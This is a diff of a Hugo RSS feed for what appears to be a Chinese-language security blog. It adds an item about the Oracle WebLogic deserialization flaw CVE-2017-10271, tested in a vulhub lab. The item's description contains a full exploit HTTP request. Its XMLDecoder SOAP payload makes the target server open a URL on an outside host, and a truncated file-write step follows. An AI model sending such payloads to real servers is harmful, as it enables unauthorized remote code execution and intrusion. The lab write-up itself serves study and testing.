@@ -7,10 +7,21 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>Copyright &amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
-    <lastBuildDate>Mon, 26 Feb 2018 13:43:20 +0800</lastBuildDate>
+    <lastBuildDate>Fri, 09 Mar 2018 09:20:03 +0800</lastBuildDate>
     
 	<atom:link href="http://wyb0.com/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>CVE-2017-10271</title>
+      <link>http://wyb0.com/posts/cve-2017-10271/</link>
+      <pubDate>Fri, 09 Mar 2018 09:20:03 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/cve-2017-10271/</guid>
+      <description>0x00 CVE-2017-10271 CVE-2017-10271是利用Oracle WebLogic中WLS 组件的反序列化漏洞进行远程代码执行的
+漏洞环境：https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271
+0x01 访问远程文件 POST /wls-wsat/CoordinatorPortType HTTP/1.1 Host: 127.0.0.1:7001 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Cookie: JSESSIONID=DJbghZRGlJf0PyyLc52n4GdvrbDkrxKWGDpwnncFpHnqsDjMT68F!-298356074 Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Length: 688 Content-Type: text/xml &amp;lt;soapenv:Envelope xmlns:soapenv=&amp;quot;http://schemas.xmlsoap.org/soap/envelope/&amp;quot;&amp;gt; &amp;lt;soapenv:Header&amp;gt; &amp;lt;work:WorkContext xmlns:work=&amp;quot;http://bea.com/2004/06/soap/workarea/&amp;quot;&amp;gt; &amp;lt;java version=&amp;quot;1.8&amp;quot; class=&amp;quot;java.beans.XMLDecoder&amp;quot;&amp;gt; &amp;lt;object id=&amp;quot;url&amp;quot; class=&amp;quot;java.net.URL&amp;quot;&amp;gt; &amp;lt;string&amp;gt;http://114.115.123.123:80/aaaaaaa&amp;lt;/string&amp;gt; &amp;lt;/object&amp;gt; &amp;lt;object idref=&amp;quot;url&amp;quot;&amp;gt; &amp;lt;void id=&amp;quot;stream&amp;quot; method = &amp;quot;openStream&amp;quot; /&amp;gt; &amp;lt;/object&amp;gt; &amp;lt;/java&amp;gt; &amp;lt;/work:WorkContext&amp;gt; &amp;lt;/soapenv:Header&amp;gt; &amp;lt;soapenv:Body/&amp;gt; &amp;lt;/soapenv:Envelope&amp;gt;  0x02 写入文件 POST /wls-wsat/CoordinatorPortType HTTP/1.</description>
+    </item>
     
     <item>
       <title>Metasploit简单提权</title>
